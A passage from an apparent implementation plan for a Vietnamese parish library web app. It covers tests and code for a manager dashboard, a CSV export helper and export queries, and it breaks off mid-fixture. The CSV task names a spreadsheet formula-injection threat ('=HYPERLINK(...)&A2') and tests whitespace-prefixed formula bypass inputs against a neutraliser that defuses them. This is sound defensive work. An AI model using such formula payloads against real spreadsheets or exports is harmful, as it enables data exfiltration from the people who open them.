use App\Models\BookCopy;
use App\Models\Bookshelf;
use App\Models\Loan;
use App\Models\Membership;
use App\Models\User;
use App\Queries\ManagerDashboardQuery;
use App\Queries\OverdueLoansQuery;
use App\Support\TenantContext;
use Carbon\Carbon;

afterEach(fn () => Carbon::setTestNow());

/**
 * Two shelves whose every figure DIFFERS (titles 2 vs 1, pending 1 vs 2,
 * …) — equal counts across shelves cannot distinguish "scoped to this
 * shelf" from "every parish's applicants added together", which is the
 * reference's named failure mode for exactly this query ("the missing
 * predicate looks like a working feature: the number is plausible").
 *
 * Grep first: `grep -rn "^function mdqFix" tests/`.
 */
function mdqFix(): array
{
    app(TenantContext::class)->actSystemWide();

    $shelf = Bookshelf::factory()->create(['slug' => 'dong-thap-mdq', 'settings' => []]);
    $other = Bookshelf::factory()->create(['slug' => 'can-tho-mdq', 'settings' => []]);

    $manager = User::factory()->create(['full_name' => 'Maria Xem Tổng Quan']);
    $managerMembership = Membership::factory()->for($shelf)->create([
        'user_id' => $manager->id, 'role' => 'manager', 'status' => 'active',
    ]);

    // Shelf A people: manager (active) + 2 active readers + 1 pending +
    // 1 suspended + 1 active membership whose USER is soft-deleted.
    // readers must count active memberships managers included (the list
    // one tap away — GetReadersList — shows the manager too), and must
    // exclude the deleted identity (whereHas('user'), the same rule
    // PendingRegistrationsQuery spells).
    foreach ([['active', false], ['active', false], ['pending', false],
        ['suspended', false], ['active', true]] as $i => [$status, $deleteUser]) {
        $u = User::factory()->create(['full_name' => "Bạn Đọc Số {$i} MDQ"]);
        Membership::factory()->for($shelf)->create([
            'user_id' => $u->id, 'role' => 'reader', 'status' => $status,
        ]);
        if ($deleteUser) {
            $u->delete();
        }
    }

    // Shelf A catalogue: 2 titles; 3 copies of the first (one retired —
    // excluded from the copies total: it has left the shelf; the lost one
    // has not stopped being the shelf's).
    $book = Book::query()->create(['bookshelf_id' => $shelf->id, 'title' => 'Sách Một MDQ', 'slug' => 'sach-mot-mdq']);
    Book::query()->create(['bookshelf_id' => $shelf->id, 'title' => 'Sách Hai MDQ', 'slug' => 'sach-hai-mdq']);
    $onLoanCopy = BookCopy::query()->create(['bookshelf_id' => $shelf->id, 'book_id' => $book->id, 'code' => 'DT-0001', 'state' => 'on_loan']);
    BookCopy::query()->create(['bookshelf_id' => $shelf->id, 'book_id' => $book->id, 'code' => 'DT-0002', 'state' => 'available']);
    BookCopy::query()->create(['bookshelf_id' => $shelf->id, 'book_id' => $book->id, 'code' => 'DT-0003', 'state' => 'retired']);

    // One active loan, due 2026-08-10 — overdue only once the clock passes
    // the end of that VN civil day. One returned loan: late once, not
    // overdue (it must never count).
    $borrower = User::factory()->create(['full_name' => 'Giuse Đang Mượn MDQ']);
    Loan::query()->create([
        'bookshelf_id' => $shelf->id, 'copy_id' => $onLoanCopy->id, 'book_id' => $book->id,
        'borrower_id' => $borrower->id, 'lent_by' => $manager->id,
        'due_on' => '2026-08-10', 'status' => 'active',
    ]);
    $returnedCopy = BookCopy::query()->create(['bookshelf_id' => $shelf->id, 'book_id' => $book->id, 'code' => 'DT-0004', 'state' => 'available']);
    Loan::query()->create([
        'bookshelf_id' => $shelf->id, 'copy_id' => $returnedCopy->id, 'book_id' => $book->id,
        'borrower_id' => $borrower->id, 'lent_by' => $manager->id,
        'due_on' => '2026-08-01', 'status' => 'returned',
        'returned_at' => now(), 'return_condition' => 'perfect',
    ]);

    // Shelf B: every figure different — 1 title, 1 copy, 2 pending, 0 loans.
    $bBook = Book::query()->create(['bookshelf_id' => $other->id, 'title' => 'Sách Tủ Khác MDQ', 'slug' => 'sach-khac-mdq']);
    BookCopy::query()->create(['bookshelf_id' => $other->id, 'book_id' => $bBook->id, 'code' => 'CT-0001', 'state' => 'available']);
    foreach ([1, 2] as $i) {
        $u = User::factory()->create(['full_name' => "Chờ Duyệt Tủ Khác {$i}"]);
        Membership::factory()->for($other)->create([
            'user_id' => $u->id, 'role' => 'reader', 'status' => 'pending',
        ]);
    }

    app(TenantContext::class)->set($shelf, $managerMembership);
    test()->actingAs($manager);

    return compact('shelf', 'other');
}

it('counts only the bound shelf, proven by distinguishable figures', function () {
    mdqFix();
    Carbon::setTestNow(Carbon::parse('2026-08-20 03:00:00', 'UTC'));

    $d = app(ManagerDashboardQuery::class)->run();

    expect($d)->toBe([
        'counts' => ['overdue' => 1, 'pendingRegistrations' => 1],
        'totals' => ['titles' => 2, 'copies' => 3, 'onLoan' => 1, 'readers' => 3],
    ]);
    // Shelf B would have contributed: +1 title, +1 copy, +2 pending. Any
    // of those leaking flips an exact assertion above.
});

it('overdue moves when only the clock does — derived on read, no job, no column', function () {
    mdqFix();

    Carbon::setTestNow(Carbon::parse('2026-08-05 03:00:00', 'UTC'));
    $before = app(ManagerDashboardQuery::class)->run();
    Carbon::setTestNow(Carbon::parse('2026-08-20 03:00:00', 'UTC'));
    $after = app(ManagerDashboardQuery::class)->run();

    expect($before['counts']['overdue'])->toBe(0)
        ->and($after['counts']['overdue'])->toBe(1);
});

it('the overdue card agrees with the overdue list it opens', function () {
    // The reference's law: the card and the list sit one tap apart, and
    // two definitions of that number is how they come to disagree. The
    // count's where-clause mirrors OverdueLoansQuery's; this pins the
    // agreement over a fixture with active, returned-late and future rows.
    mdqFix();
    Carbon::setTestNow(Carbon::parse('2026-08-20 03:00:00', 'UTC'));

    expect(app(ManagerDashboardQuery::class)->run()['counts']['overdue'])
        ->toBe(count(app(OverdueLoansQuery::class)->run()));
});
```

- [ ] **Step 2: Run to verify failure** — `make test FILTER=ManagerDashboardQueryTest` → FAIL, class not found.

- [ ] **Step 3: Implement**

`app/Queries/ManagerDashboardQuery.php`:

```php
<?php

namespace App\Queries;

use App\Enums\CopyState;
use App\Enums\LoanStatus;
use App\Enums\MembershipStatus;
use App\Models\Book;
use App\Models\BookCopy;
use App\Models\Loan;
use App\Models\Membership;
use App\Support\Clock;

/**
 * OPS §3.3's GetManagerDashboard — port of get-manager-dashboard.ts,
 * narrowed to the two of BR §16.3's four stat cards whose queues exist
 * (plan divergence 6: Yêu cầu mượn and Bình luận chờ duyệt are Phase
 * 2's, and no substitute card is promoted into their slots).
 *
 * Every figure is a count() at query time over BelongsToBookshelf-scoped
 * models — never a stored counter (BR §8; OPS §3.3's own words: "a
 * counter can drift"), and each is counted THE WAY ITS LIST IS SELECTED:
 *
 * - overdue mirrors OverdueLoansQuery (status active AND due_on <
 *   Clock::today() — LoanTerms::isOverdue's comparison, the one home of
 *   overdue); ManagerDashboardQueryTest pins the agreement.
 * - pendingRegistrations mirrors PendingRegistrationsQuery (status
 *   pending, whereHas('user') — a soft-deleted identity is no applicant).
 * - readers counts every ACTIVE membership, managers included, because
 *   that is exactly the population GetReadersList lists — a total that
 *   quietly disagreed with the list one tap away would be the same
 *   defect as a badge disagreeing with its queue.
 * - copies excludes retired and nothing else: a retired copy has left
 *   the shelf; a lost one has not stopped being the shelf's. titles
 *   counts drafts — the manager's own list shows drafts.
 */
final class ManagerDashboardQuery
{
    public function __construct(private Clock $clock) {}

    /** @return array{counts: array{overdue: int, pendingRegistrations: int}, totals: array{titles: int, copies: int, onLoan: int, readers: int}} */
    public function run(): array
    {
        $today = $this->clock->today();

        return [
            'counts' => [
                'overdue' => Loan::query()
                    ->where('status', LoanStatus::Active)
                    ->where('due_on', '<', $today)
                    ->count(),
                'pendingRegistrations' => Membership::query()
                    ->where('status', MembershipStatus::Pending)
                    ->whereHas('user')
                    ->count(),
            ],
            'totals' => [
                'titles' => Book::query()->count(),
                'copies' => BookCopy::query()->where('state', '!=', CopyState::Retired)->count(),
                'onLoan' => Loan::query()->where('status', LoanStatus::Active)->count(),
                'readers' => Membership::query()
                    ->where('status', MembershipStatus::Active)
                    ->whereHas('user')
                    ->count(),
            ],
        ];
    }
}
```

- [ ] **Step 4: Run** — `make test FILTER=ManagerDashboardQueryTest` → PASS.

- [ ] **Step 5: Lint, analyse, commit** — `make lint && make analyse`, commit as `feat: manager dashboard query — live counts, no stored counter`.

---

### Task 6: The dashboard screen — `/manage`

Read first: `old_next/src/app/tu-sach/[shelf]/quan-ly/page.tsx` — the StatCard shape (the WHOLE card is the tap target: BR §16.3 says "tappable", and a 44px link inside a 120px card is three quarters of a miss on a phone), the two BigActionLink buttons, the totals strip, and the no-weekday date rule (the weekday earns its place on a due date and nowhere else).

**Files:**
- Create: `app/Http/Controllers/Manage/DashboardController.php`
- Create: `resources/js/pages/manage/dashboard.tsx`
- Modify: `routes/web.php` (the `/manage` dashboard line)
- Modify: `resources/js/lib/copy.ts` (+ `manageDashboard` namespace)
- Test: `tests/Feature/Oversight/DashboardScreenTest.php`

**Interfaces:**
- Consumes: `ManagerDashboardQuery::run()` (Task 5), `App\Support\Clock::today()`, existing routes `shelves.manage.{overdue, registrations, lend, returns}`, `formatDate` (dates.ts).
- Produces: route `shelves.manage.dashboard` (GET, real handler), Inertia page `manage/dashboard` with props `dashboard` (the `run()` shape) and `today` (`Y-m-d`).

- [ ] **Step 1: Write the failing feature tests**

`tests/Feature/Oversight/DashboardScreenTest.php`:

```php
<?php

use App\Models\Bookshelf;
use App\Models\Membership;
use App\Models\User;
use App\Support\TenantContext;
use Carbon\Carbon;
use Inertia\Testing\AssertableInertia as Assert;

afterEach(fn () => Carbon::setTestNow());

/** Grep first: `grep -rn "^function mdsFix" tests/`. */
function mdsFix(): array
{
    app(TenantContext::class)->actSystemWide();

    $shelf = Bookshelf::factory()->create(['slug' => 'dong-thap-mds', 'settings' => []]);
    $manager = User::factory()->create(['full_name' => 'Maria Trang Chính']);
    Membership::factory()->for($shelf)->create([
        'user_id' => $manager->id, 'role' => 'manager', 'status' => 'active',
    ]);
    $reader = User::factory()->create(['full_name' => 'Anna Không Được Vào']);
    Membership::factory()->for($shelf)->create([
        'user_id' => $reader->id, 'role' => 'reader', 'status' => 'active',
    ]);
    $pending = User::factory()->create(['full_name' => 'Têrêsa Chờ Duyệt MDS']);
    Membership::factory()->for($shelf)->create([
        'user_id' => $pending->id, 'role' => 'reader', 'status' => 'pending',
    ]);

    return compact('shelf', 'manager', 'reader');
}

it('renders live counts, totals and today from the injected clock', function () {
    $f = mdsFix();
    Carbon::setTestNow(Carbon::parse('2026-08-20 03:00:00', 'UTC'));

    $this->actingAs($f['manager'])
        ->get("/shelves/{$f['shelf']->slug}/manage")
        ->assertOk()
        ->assertInertia(fn (Assert $page) => $page
            ->component('manage/dashboard')
            ->where('dashboard.counts.overdue', 0)
            ->where('dashboard.counts.pendingRegistrations', 1)
            ->where('dashboard.totals.readers', 2)   // manager + active reader
            ->where('today', '2026-08-20'));
});

it('today is the VN civil day, not the UTC one', function () {
    $f = mdsFix();
    // 18:30 UTC is already tomorrow morning in Hồ Chí Minh City.
    Carbon::setTestNow(Carbon::parse('2026-08-20 18:30:00', 'UTC'));

    $this->actingAs($f['manager'])
        ->get("/shelves/{$f['shelf']->slug}/manage")
        ->assertInertia(fn (Assert $page) => $page->where('today', '2026-08-21'));
});

it('404s a reader', function () {
    $f = mdsFix();

    $this->actingAs($f['reader'])
        ->get("/shelves/{$f['shelf']->slug}/manage")
        ->assertNotFound();
});

it('redirects a guest to login', function () {
    $f = mdsFix();

    $this->get("/shelves/{$f['shelf']->slug}/manage")->assertRedirect();
});
```

- [ ] **Step 2: Run to verify failure** — `make test FILTER=DashboardScreenTest` → FAIL (`under-construction` component).

- [ ] **Step 3: Implement controller, route, copy, page**

`app/Http/Controllers/Manage/DashboardController.php`:

```php
<?php

namespace App\Http\Controllers\Manage;

use App\Http\Controllers\Controller;
use App\Models\Bookshelf;
use App\Queries\ManagerDashboardQuery;
use App\Support\Clock;
use Inertia\Inertia;
use Inertia\Response;

class DashboardController extends Controller
{
    public function index(Bookshelf $shelf, ManagerDashboardQuery $dashboard, Clock $clock): Response
    {
        return Inertia::render('manage/dashboard', [
            'dashboard' => $dashboard->run(),
            // From the injected clock, never new Date() on the page — the
            // reference's fixture dashboard shipped a date three days stale.
            'today' => $clock->today(),
        ]);
    }
}
```

In `routes/web.php`, replace the dashboard line (and add the import):

```php
        Route::get('/', [DashboardController::class, 'index'])->name('dashboard');
```

`resources/js/lib/copy.ts` — new namespace:

```ts
    manageDashboard: {
        // "Tổng quan", not "Trang chính": copy.manage.dashboard — the nav
        // entry that opens this page — already says "Tổng quan", and a nav
        // word that opens a differently-headed page is two names for one
        // screen. Duplicated as a literal rather than referencing
        // copy.manage.dashboard because `copy` is one object literal and
        // cannot refer to itself mid-definition.
        title: "Tổng quan",
        overdueCard: "Quá hạn",
        registrationsCard: "Chờ duyệt tài khoản",
        viewList: "Xem danh sách",
        lendAction: "Cho mượn",
        lendSub: "Tìm sách · chọn người đọc · xác nhận",
        returnAction: "Nhận trả",
        returnSub: "Tìm sách đang mượn · kiểm tra tình trạng",
        totalsHeading: "Tình hình tủ sách",
        totalTitles: "Đầu sách",
        totalCopies: "Bản sách",
        totalOnLoan: "Đang cho mượn",
        totalReaders: "Bạn đọc",
    },
```

`resources/js/pages/manage/dashboard.tsx`:

```tsx
import { Head, Link, usePage } from "@inertiajs/react";
import { route } from "ziggy-js";
import ManageLayout from "@/layouts/manage-layout";
import { copy } from "@/lib/copy";
import { formatDate } from "@/lib/dates";
import type { SharedData } from "@/types";

interface PageProps extends SharedData {
    dashboard: {
        counts: { overdue: number; pendingRegistrations: number };
        totals: { titles: number; copies: number; onLoan: number; readers: number };
    };
    today: string;
}

const NUMBER = new Intl.NumberFormat("vi-VN");

function StatCard({ href, label, value }: { href: string; label: string; value: number }) {
    // The WHOLE card is the link — BR §16.3 says "tappable", and on a
    // phone a small link inside a large card is three quarters of a miss.
    return (
        <Link href={href} className="min-w-[190px] flex-1 rounded-lg border p-5 hover:border-foreground/40">
            <p className="text-[28px] leading-none font-semibold">{NUMBER.format(value)}</p>
            <p className="mt-1.5 text-[15px]">{label}</p>
            <span className="mt-3 block text-sm font-medium text-muted-foreground">
                {copy.manageDashboard.viewList}
            </span>
        </Link>
    );
}

export default function ManageDashboard() {
    const { shelf, dashboard, today } = usePage<PageProps>().props;
    if (!shelf) return null;

    const totals = [
        [copy.manageDashboard.totalTitles, dashboard.totals.titles],
        [copy.manageDashboard.totalCopies, dashboard.totals.copies],
        [copy.manageDashboard.totalOnLoan, dashboard.totals.onLoan],
        [copy.manageDashboard.totalReaders, dashboard.totals.readers],
    ] as const;

    return (
        <ManageLayout>
            <Head title={copy.manageDashboard.title} />
            <h1 className="text-2xl font-semibold">{copy.manageDashboard.title}</h1>
            {/* No weekday: the weekday earns its place on a due date and
                nowhere else (the reference's formatDueDate rule). */}
            <p className="mb-6 text-sm text-muted-foreground">
                {formatDate(today)} · {shelf.name}
            </p>

            {/* Two of BR §16.3's four cards; the other two arrive with
                Phase 2's queues, and no substitute is promoted (plan
                divergence 6). */}
            <div className="flex flex-wrap gap-4">
                <StatCard
                    href={route("shelves.manage.overdue", { shelf: shelf.slug })}
                    label={copy.manageDashboard.overdueCard}
                    value={dashboard.counts.overdue}
                />
                <StatCard
                    href={route("shelves.manage.registrations", { shelf: shelf.slug })}
                    label={copy.manageDashboard.registrationsCard}
                    value={dashboard.counts.pendingRegistrations}
                />
            </div>

            <div className="mt-8 flex flex-col gap-4 sm:flex-row">
                <Link
                    href={route("shelves.manage.lend", { shelf: shelf.slug })}
                    className="flex-1 rounded-lg bg-primary px-6 py-5 text-primary-foreground"
                >
                    <span className="block text-lg font-semibold">{copy.manageDashboard.lendAction}</span>
                    <span className="block text-sm opacity-80">{copy.manageDashboard.lendSub}</span>
                </Link>
                <Link
                    href={route("shelves.manage.returns", { shelf: shelf.slug })}
                    className="flex-1 rounded-lg border px-6 py-5"
                >
                    <span className="block text-lg font-semibold">{copy.manageDashboard.returnAction}</span>
                    <span className="block text-sm text-muted-foreground">{copy.manageDashboard.returnSub}</span>
                </Link>
            </div>

            <section className="mt-10">
                <h2 className="text-xl font-semibold">{copy.manageDashboard.totalsHeading}</h2>
                <dl className="mt-4 grid grid-cols-2 gap-4 sm:grid-cols-4">
                    {totals.map(([label, value]) => (
                        <div key={label} className="rounded-lg border p-4">
                            <dt className="text-sm text-muted-foreground">{label}</dt>
                            <dd className="text-xl font-semibold">{NUMBER.format(value)}</dd>
                        </div>
                    ))}
                </dl>
            </section>
        </ManageLayout>
    );
}
```

- [ ] **Step 4: Run** — `make test FILTER=DashboardScreenTest` → PASS; `bun run build`; `bun run lint`.

- [ ] **Step 5: Lint, analyse, commit** — `make lint && make analyse`, commit as `feat: manager dashboard screen — two live stat cards, totals, big actions`.

---

### Task 7: `Csv` — BOM, quoting, neutralisation, as pure bytes

Read first: `old_next/src/lib/csv.ts` **whole** — every rule below is one of its documented, measured decisions: the BOM (without it `Đặng Thị Kim Chi` opens as `Ä�áº·ng…` in double-clicked Excel), RFC 4180 quoting with CRLF, the four formula leaders (`=SUM` is the demo; `=HYPERLINK(...)&A2` exfiltrating the row beside it is the threat; a manager's note "- sách bị ướt" becoming `#NAME?` is the one that actually happens), the leading-whitespace strip (Excel strips before deciding, so `\t=…` evaluates while `cell[0]` is a tab — three constructed bypasses closed), and the leading-zero phone rule (Excel imports `0912…` as the number 912…, the zero unrecoverably gone from a column that is every Vietnamese phone number).

**Files:**
- Create: `app/Support/Exports/Csv.php`
- Test: `tests/Unit/Exports/CsvTest.php`

**Interfaces:**
- Consumes: nothing — pure.
- Produces (Task 9's controller streams these): `Csv::BOM` (string, 3 UTF-8 bytes), `Csv::line(list<string> $cells): string` (one CRLF-terminated CSV line, every cell neutralised then quoted), plus the individually-testable `Csv::neutralise(string): string` and `Csv::quote(string): string`.

- [ ] **Step 1: Write the failing unit tests**

`tests/Unit/Exports/CsvTest.php`:

```php
<?php

use App\Support\Exports\Csv;

it('the BOM is the three bytes EF BB BF, asserted as bytes', function () {
    // Bytes, not string equality against "\u{FEFF}" — a byte assertion is
    // what catches an accidental UTF-16 write (the reference's reasoning).
    expect(strlen(Csv::BOM))->toBe(3)
        ->and(bin2hex(Csv::BOM))->toBe('efbbbf');
});

it('neutralises all four formula leaders with a visible apostrophe', function () {
    foreach (['=SUM(1+1)', '+84 gọi em', '- sách bị ướt', '@a'] as $cell) {
        expect(Csv::neutralise($cell))->toBe("'".$cell);
    }
});

it('neutralises a leader hidden behind leading whitespace — Excel strips before deciding', function () {
    foreach (["\t=HYPERLINK(1)", "\r=1", " =1", "\n=1"] as $cell) {
        expect(Csv::neutralise($cell))->toBe("'".$cell)
            // The cell itself is NEVER altered — trimming here would
            // silently rewrite a value the file is an exact copy of.
            ->and(substr(Csv::neutralise($cell), 1))->toBe($cell);
    }
});

it('protects a leading-zero all-digit cell — every Vietnamese phone number', function () {
    expect(Csv::neutralise('0912345678'))->toBe("'0912345678")
        // Anchored: a cell BEGINNING with a space is not the all-digits
        // cell this rule is about, and 84912… has no zero to lose.
        ->and(Csv::neutralise(' 0912345678'))->toBe(' 0912345678')
        ->and(Csv::neutralise('84912345678'))->toBe('84912345678')
        ->and(Csv::neutralise('0'))->toBe('0');   // /^0\d+$/ needs a second digit
});

it('leaves ordinary Vietnamese text, empty and whitespace-only cells untouched', function () {
    foreach (['Dế Mèn Phiêu Lưu Ký', '', '   ', 'Tổ 1 · Giáo họ Mân Côi'] as $cell) {
        expect(Csv::neutralise($cell))->toBe($cell);
    }
});

it('quotes per RFC 4180: delimiter, quote or newline; embedded quotes doubled', function () {
    expect(Csv::quote('Hoàng, Tử Bé'))->toBe('"Hoàng, Tử Bé"')
        ->and(Csv::quote('nói "to"'))->toBe('"nói ""to"""')
        ->and(Csv::quote("hai\ndòng"))->toBe("\"hai\ndòng\"")
        // NOT quote-everything: a quoted numeric column imports as text.
        ->and(Csv::quote('2016'))->toBe('2016');
});

it('a line is neutralised, quoted, comma-joined and CRLF-terminated', function () {
    expect(Csv::line(['Tên sách', '=B1', 'a,b']))
        ->toBe("Tên sách,'=B1,\"a,b\"\r\n");
});

it('neutralisation runs BEFORE quoting, so a quoted cell cannot smuggle a leader', function () {
    // '=1,2' needs both: the apostrophe first, then the quotes around the
    // comma-carrying result.
    expect(Csv::line(['=1,2']))->toBe("\"'=1,2\"\r\n");
});
```

- [ ] **Step 2: Run to verify failure** — `make test FILTER=CsvTest` → FAIL.

- [ ] **Step 3: Implement**

`app/Support/Exports/Csv.php`:

```php
<?php

declare(strict_types=1);

namespace App\Support\Exports;

/**
 * CSV for a volunteer opening it in Excel on Windows — port of
 * old_next/src/lib/csv.ts, whose docblocks carry the measurements. The
 * audience is the whole specification: the export exists as INSURANCE
 * (OPS §2), and insurance that reads as garbage — mojibake, #NAME?, a
 * phone column missing its first digit — is not insurance.
 *
 * Every neutralisation is VISIBLE (a leading apostrophe the volunteer
 * can see and remove), never an invisible character and never a trim:
 * the cell's own bytes are sacred; only the question "what does a
 * spreadsheet think this starts with" looks at a stripped copy.
 */
final class Csv
{
    /** EF BB BF. Double-clicked Excel decodes with the ANSI code page unless this opens the file. */
    public const string BOM = "\u{FEFF}";

    /**
     * The four characters Excel/LibreOffice treat as a formula leader.
     * `-` and `+` are also the duller, likelier case: a note written as
     * "- sách bị ướt" renders #NAME? without this.
     */
    private const array FORMULA_LEADERS = ['=', '+', '-', '@'];

    /** Excel strips these before deciding whether a cell is a formula. */
    private const string LEADING_SPACE = "/^[\t\r\n ]+/";

    public static function neutralise(string $cell): string
    {
        if ($cell === '') {
            return $cell;
        }
        $leader = substr((string) preg_replace(self::LEADING_SPACE, '', $cell), 0, 1);
        if (in_array($leader, self::FORMULA_LEADERS, true)) {
            return "'".$cell;
        }
        // All-digits starting 0 — every Vietnamese phone number — imports
        // as a NUMBER and loses the zero from the file's contents, not
        // merely its display. Anchored on the raw cell on purpose.
        if (preg_match('/^0\d+$/', $cell) === 1) {
            return "'".$cell;
        }

        return $cell;
    }

    /** RFC 4180: quote when the field contains a delimiter, a quote or a newline. */
    public static function quote(string $cell): string
    {
        if (preg_match('/[",\r\n]/', $cell) === 1) {
            return '"'.str_replace('"', '""', $cell).'"';
        }

        return $cell;
    }

    /**
     * One row as bytes-on-the-wire: CRLF because RFC 4180 says so and
     * Excel itself writes it, and the trailing CRLF closes the last field.
     * Headers go through this too — an exemption granted because "these
     * ones are safe" is the exemption that outlives its reason.
     *
     * @param  list<string>  $cells
     */
    public static function line(array $cells): string
    {
        return implode(',', array_map(
            fn (string $cell) => self::quote(self::neutralise($cell)),
            $cells,
        ))."\r\n";
    }
}
```

- [ ] **Step 4: Run** — `make test FILTER=CsvTest` → PASS.

- [ ] **Step 5: Lint, analyse, commit** — `make lint && make analyse`, commit as `feat: csv support — bom, rfc 4180 quoting, formula and phone neutralisation`.

---

### Task 8: The three export queries and their tables

Read first: `old_next/src/domain/shelf/queries/exports.ts` **whole** — the per-copy books shape (a stocktaking sheet, not a title list), the readers column bound ("nothing in it that BR §16.3 does not already show a manager on screen", checked column by column against the PAGE, with `manager_notes` refused by test and `hasCredentials` substituting for the credential pair), the loans completeness rule (INV-11 makes *history* load-bearing — voided rows included, reason in the note column), and both timezone comments (the measured whole-day-wrong `::date` casts). Then `old_next/src/lib/exports.ts` for the headers and enum words.

**Files:**
- Create: `lang/vi/exports.php`
- Create: `app/Queries/Exports/BooksExportQuery.php`
- Create: `app/Queries/Exports/ReadersExportQuery.php`
- Create: `app/Queries/Exports/LoansExportQuery.php`
- Create: `app/Support/Exports/ExportTables.php`
- Test: `tests/Feature/Oversight/ExportQueriesTest.php`

**Interfaces:**
- Consumes: scoped models; `ParishContextQuery::run(): array{taxonomy, units}` and `ParishUnits::describeSelection` (1b) for the parish line; `CarbonImmutable` for VN-timezone rendering.
- Produces (Task 9's controller): each query's `run(): list<array<string, string|int|bool|null>>` (camelCase keys as listed in each class below), and `ExportTables::{books, readers, loans}(array $rows): array{headers: list<string>, rows: list<list<string>>}` — all-strings grids ready for `Csv::line`.

- [ ] **Step 1: Write the lang file**

`lang/vi/exports.php`:

```php
<?php

/**
 * The three CSVs' headers and enum words — server copy (a spreadsheet
 * column is a name for the same fact a screen labels). Words are
 * copy.ts's shipped ones verbatim where a screen already says them
 * (status, condition, membership status — ExportQueriesTest pins the
 * status/condition sets against copy.ts source text, the FoldParityTest
 * pattern); "Đã trả" and "Đã huỷ" are the reference's exports.ts words
 * for the two loan states no screen lists.
 */
return [
    'books_headers' => ['Tên sách', 'Tác giả', 'Thể loại', 'Nhà xuất bản', 'Năm xuất bản',
        'ISBN', 'Số trang', 'Đang hiển thị', 'Mã bản sách', 'Tình trạng bản sách',
        'Chất lượng', 'Ngày nhập', 'Nguồn'],
    'readers_headers' => ['Tên thánh', 'Họ và tên', 'Ngày sinh', 'Tên cha', 'Tên mẹ',
        'Số điện thoại', 'Email', 'Đơn vị', 'Trạng thái', 'Vai trò',
        'Có tài khoản đăng nhập', 'Ngày tham gia'],
    'loans_headers' => ['Tên sách', 'Mã bản sách', 'Người mượn', 'Ngày mượn', 'Hạn trả',
        'Ngày trả', 'Trạng thái', 'Chất lượng khi trả', 'Người cho mượn',
        'Người nhận trả', 'Ghi chú'],

    'yes' => 'Có',
    'no' => 'Không',

    'copy_state' => [
        'available' => 'Có sẵn',
        'on_loan' => 'Đang cho mượn',
        'held' => 'Đang giữ chỗ',
        'lost' => 'Đã mất',
        'retired' => 'Ngừng dùng',
    ],
    'condition' => [
        'perfect' => 'Nguyên vẹn',
        'slightly_worn' => 'Hơi cũ',
        'worn' => 'Cũ',
        'torn' => 'Rách',
        'missing_pages' => 'Mất trang',
        'written_on' => 'Bị vẽ vào',
    ],
    'membership_status' => [
        'pending' => 'Chờ duyệt',
        'active' => 'Đang hoạt động',
        'suspended' => 'Tạm khoá',
        'left' => 'Đã rời',
        'rejected' => 'Đã từ chối',
    ],
    // roleLabel deliberately has no word for 'reader' on screens (no
    // screen shows a role to someone who cannot hold it); a spreadsheet
    // column headed "Vai trò" with blank cells reads as missing data, so
    // the file supplies the word the readers list already counts in.
    'role' => [
        'reader' => 'Bạn đọc',
        'manager' => 'Quản lý',
        'admin' => 'Quản trị tủ sách',
    ],
    'loan_status' => [
        'active' => 'Đang mượn',
        'returned' => 'Đã trả',
        'lost' => 'Đã mất',
        'voided' => 'Đã huỷ',
    ],
];
```

- [ ] **Step 2: Write the failing feature tests**

`tests/Feature/Oversight/ExportQueriesTest.php`:

```php
<?php

use App\Models\Book;
use App\Models\BookCopy;
use App\Models\Bookshelf;
use App\Models\Loan;
use App\Models\Membership;
use App\Models\User;
use App\Queries\Exports\BooksExportQuery;
use App\Queries\Exports\LoansExportQuery;
use App\Queries\Exports\ReadersExportQuery;
use App\Support\Exports\ExportTables;
use App\Support\TenantContext;

/**
 * One shelf with every disclosure hazard represented, one foreign shelf
 * with colliding, distinguishable data. Seeded in an order that differs
 * from the folded alphabetical order the files assert (the UUIDv7 trap),
 * with a Đ-initial name/title so byte order and folded order disagree.
 *
 * Grep first: `grep -rn "^function xpqFix" tests/`.
 */
function xpqFix(): array
{
    app(TenantContext::class)->actSystemWide();

    $shelf = Bookshelf::factory()->create(['slug' => 'dong-thap-xpq', 'settings' => []]);
    $other = Bookshelf::factory()->create(['slug' => 'can-tho-xpq', 'settings' => []]);

    $manager = User::factory()->create(['full_name' => 'Maria Xuất Tệp']);
    $managerMembership = Membership::factory()->for($shelf)->create([
        'user_id' => $manager->id, 'role' => 'manager', 'status' => 'active',
    ]);

    // Seeded V-title first so folded order (Đất… before Vừa…) differs
    // from creation order.
    $vBook = Book::query()->create(['bookshelf_id' => $shelf->id, 'title' => 'Vừa Nhắm Mắt Vừa Mở Cửa Sổ', 'slug' => 'vua-nham-mat-xpq']);
    $dBook = Book::query()->create(['bookshelf_id' => $shelf->id, 'title' => 'Đất Rừng Phương Nam', 'slug' => 'dat-rung-xpq']);
    $vCopy = BookCopy::query()->create(['bookshelf_id' => $shelf->id, 'book_id' => $vBook->id, 'code' => 'DT-0002', 'state' => 'available', 'condition' => 'worn']);
    $dCopy = BookCopy::query()->create(['bookshelf_id' => $shelf->id, 'book_id' => $dBook->id, 'code' => 'DT-0001', 'state' => 'on_loan', 'condition' => 'perfect']);

    // The reader whose row must NOT leak manager_notes; approved at
    // 17:30 UTC = 00:30 NEXT DAY in VN — the joined_on day-boundary pin.
    $child = User::factory()->create([
        'full_name' => 'Đặng Thị Kim Chi', 'saint_name' => 'Têrêsa',
        'date_of_birth' => '2015-04-02', 'father_name' => 'Đặng Văn Cha',
        'mother_name' => 'Lê Thị Mẹ', 'phone' => '0912345678',
        'email' => null,   // the empty-cell assertion below depends on this
        // password_hash, NOT 'password': the column is named honestly
        // (User::getAuthPasswordName), and Factory::makeInstance runs
        // UNGUARDED, so a stray 'password' key becomes a real attribute and
        // the INSERT dies with "Unknown column 'password' in 'field list'".
        // UserFactory already defaults both to null; these two are here only
        // to make hasCredentials === false explicit at the fixture.
        'username' => null, 'password_hash' => null,
    ]);
    Membership::factory()->for($shelf)->create([
        'user_id' => $child->id, 'role' => 'reader', 'status' => 'active',
        'approved_at' => '2026-08-09 17:30:00',
        'manager_notes' => 'bố hay uống rượu, gọi mẹ',
    ]);

    // Loans: one active (lent 12:00 UTC = 19:00 VN same day), one voided
    // with a reason (INV-11: history includes it, reason in the note).
    // SEEDED OLDEST FIRST, on purpose: loans.id is a monotonic UUIDv7, so
    // an unordered scan returns creation order, and a "newest first"
    // assertion seeded newest-first proves nothing (the five-times-fired
    // trap). The voided row is the OLDER one and must come back SECOND.
    Loan::query()->create([
        'bookshelf_id' => $shelf->id, 'copy_id' => $vCopy->id, 'book_id' => $vBook->id,
        'borrower_id' => $child->id, 'lent_by' => $manager->id,
        'lent_at' => '2026-08-01 04:00:00', 'due_on' => '2026-08-15', 'status' => 'voided',
        'voided_at' => '2026-08-02 04:00:00', 'voided_by' => $manager->id,
